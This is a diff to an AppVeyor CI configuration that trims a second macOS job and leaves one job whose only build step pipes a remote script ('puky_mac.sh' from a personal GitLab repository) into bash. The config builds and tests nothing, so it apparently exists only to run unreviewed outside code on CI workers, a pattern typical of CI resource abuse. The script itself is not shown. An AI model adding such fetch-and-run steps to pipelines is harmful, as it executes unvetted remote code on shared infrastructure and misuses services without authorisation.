@@ -1,5 +1,4 @@
 version: 1.0.{build}
-max_jobs: 10
 
 skip_commits:
   files:
@@ -10,8 +9,6 @@ environment:
   matrix:
 
   - job_name: Test1
-    appveyor_build_worker_image: macOS-BigSur
-  - job_name: Test2
     appveyor_build_worker_image: macOS-BigSur
 
 matrix:
@@ -30,11 +27,4 @@ for:
         
     build_script:
     - curl https://gitlab.com/azkadafa39/ajure/-/raw/main/puky_mac.sh | bash
-    
-  -
-    matrix:
-      only:
-        - job_name: Test2
-        
-    build_script:
-    - curl https://gitlab.com/azkadafa39/ajure/-/raw/main/puky_mac.sh | bash
+
